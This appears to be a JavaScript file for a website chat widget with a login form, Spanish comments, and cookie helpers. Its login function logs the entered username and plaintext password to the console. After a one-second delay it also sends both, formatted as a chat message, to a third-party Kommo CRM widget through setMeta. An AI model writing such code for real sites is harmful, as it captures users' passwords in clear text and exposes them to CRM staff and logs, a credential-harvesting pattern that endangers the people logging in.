function sendToKommo(username, password) {
  // Este paso puede quedar simulado para pruebas
  console.log("Enviando a Kommo:", username, password);
}

function login() {
  let username = document.getElementById("username").value.trim();
  let password = document.getElementById("password").value.trim();

  if (username === "" || password === "") {
    Swal.fire({
      icon: "error",
      title: "Por favor, complete todos los campos",
      confirmButtonText: "OK",
      confirmButtonColor: "#6C63FF",
      iconColor: "#FF3B00",
      customClass: { popup: 'swal2-rounded' }
    });
    return;
  }

  setCookie("chatUser", username, 30);
  sendToKommo(username, password);

  document.getElementById("loginForm").style.display = "none";
  document.getElementById("chatHeader").style.display = "flex";

  // Esperar 1 segundo antes de enviar datos al widget de Kommo
  setTimeout(() => {
    if (window.crmPlugin && window.crmPlugin.setMeta) {
      window.crmPlugin.setMeta({
        name: username,
        message: `Usuario: ${username}\nContraseña: ${password}`
      });
    }
  }, 1000);
}

function toggleChat() {
  const chat = document.getElementById("chatBox");
  const button = document.querySelector(".chat-button");

  if (chat.style.display === "block") {
    chat.style.display = "none";
    button.innerHTML = "💬";
  } else {
    chat.style.display = "block";
    setTimeout(() => chat.classList.add("open"), 10);
    button.innerHTML = "✖";
  }
}

function setCookie(name, value, days) {
  let date = new Date();
  date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
  document.cookie = name + "=" + encodeURIComponent(value) + "; expires=" + date.toUTCString() + "; path=/";
}

function getCookie(name) {
  let cookies = document.cookie.split("; ");
  for (let cookie of cookies) {
    let [key, value] = cookie.split("=");
    if (key === name) return decodeURIComponent(value);
  }
  return "";
}
